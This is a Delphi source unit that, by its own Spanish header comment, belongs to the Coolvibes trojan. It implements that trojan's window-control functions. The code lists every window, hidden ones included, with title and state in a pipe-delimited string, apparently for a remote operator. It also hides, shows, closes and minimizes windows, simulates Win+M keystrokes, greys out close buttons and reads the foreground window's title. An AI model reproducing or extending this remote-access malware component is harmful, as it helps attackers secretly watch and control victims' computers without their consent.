{Unit perteneciente al troyano Coolvibes que contiene todas las funciones
para manejar ventanas}
unit UnitWindows;

interface

uses
  Windows,
  Messages,
  SysUtils;

function GetWins(MostrarOcultas: Boolean): string;
procedure CerrarVentana(Handle: HWND);
procedure MostrarVentana(Handle: HWND);
procedure OcultarVentana(Handle: HWND);
procedure MaximizarVentana(Handle: HWND);
procedure MinimizarVentana(Handle: HWND);
procedure MinimizarTodas();
procedure BotonCerrar(YesNo: Boolean; Handle: HWND);
function AppActivateHandle(WindowHandle: HWND): Boolean;
function GetActiveWindowCaption(): string; //Devuelve el título de la ventana activa
function EnumWindowProc(Hwnd: HWND; i: Integer): Bool;export;  stdcall;
implementation

var
  Cadena: string;
  MO: Boolean; //MostrarOcultas
      Titulo: string;


function EnumWindowProc(Hwnd: HWND; i: Integer): Bool; export; stdcall;
  var
    Estado: string;
  begin
    if (Hwnd > 0) then
      begin

        if (MO or IsWindowVisible(Hwnd)) then
        begin
         SetLength(Titulo, 255);
         SetLength(Titulo, GetWindowText(Hwnd, Pchar(Titulo), Length(Titulo)));

          if (not IsWindowVisible(Hwnd)) then
            estado := '0'
          else
            estado := '2';

          if IsZoomed(Hwnd) then
            estado := '1';

          if IsIconic(Hwnd) then
            estado := '3';

          if GetForegroundWindow() = hwnd then
            estado := '4';
            
          if (Length(Titulo) > 0) then
            begin
              Cadena := Cadena + StringReplace(Titulo, '|', '-', [rfReplaceAll])+'|' + IntToStr(Hwnd) + '|' + Estado + '|';
            end;
        end;
      end;
      Result := True;
  end;

  
function GetWins(MostrarOcultas: Boolean): string;
begin
  Cadena := '';
  MO := MostrarOcultas;
  EnumWindows(@EnumWindowProc, 0);
  Result := '';
  Result := Cadena;
end;

procedure CerrarVentana(Handle: HWND);
begin
  SendMessage(Handle, WM_CLOSE, 0, 0);
end;

procedure MostrarVentana(Handle: HWND);
begin
  ShowWindow(Handle, SW_SHOW);
end;

procedure OcultarVentana(Handle: HWND);
begin
  ShowWindow(Handle, SW_HIDE);
end;

procedure MaximizarVentana(Handle: HWND);
begin
  ShowWindow(Handle, SW_MAXIMIZE);
end;

procedure MinimizarVentana(Handle: HWND);
begin
  ShowWindow(Handle, SW_MINIMIZE);
end;

procedure MinimizarTodas();
begin
  keybd_event(VK_LWIN, MapvirtualKey(VK_LWIN, 0), 0, 0);
  keybd_event(Ord('M'), MapvirtualKey(Ord('M'), 0), 0, 0);
  keybd_event(Ord('M'), MapvirtualKey(Ord('M'), 0), KEYEVENTF_KEYUP, 0);
  keybd_event(VK_LWIN, MapvirtualKey(VK_LWIN, 0), KEYEVENTF_KEYUP, 0);
end;

procedure BotonCerrar(YesNo: Boolean; Handle: HWND);
var
  hMnu: THandle;
begin
  if YesNo = False then
    begin
      hMnu := GetSystemMenu(Handle, False);
      EnableMenuItem(hMnu, SC_CLOSE, MF_GRAYED);
    end
  else
    begin
      hMnu := GetSystemMenu(Handle, False);
      EnableMenuItem(hMnu, SC_CLOSE, MF_ENABLED);
    end;
end;

function AppActivateHandle(WindowHandle: HWND): Boolean;
begin
  try
    Result := True;
    if (WindowHandle <> 0) then
      begin
        SendMessage(WindowHandle, WM_SYSCOMMAND, SC_HOTKEY, WindowHandle);
        SendMessage(WindowHandle, WM_SYSCOMMAND, SC_RESTORE, WindowHandle);
        SetForegroundWindow(WindowHandle);
      end
    else
      Result := False;
  except
    on Exception do
      Result := False;
  end;
end;

function GetActiveWindowCaption(): string;
var
  awindow: string;
begin
  SetLength(awindow, 255);
  SetLength(awindow, GetWindowText(GetForegroundWindow(), PChar(awindow), Length(awindow)));
  Result := StringReplace(awindow, '|', '-', [rfReplaceAll]);
end;
end.
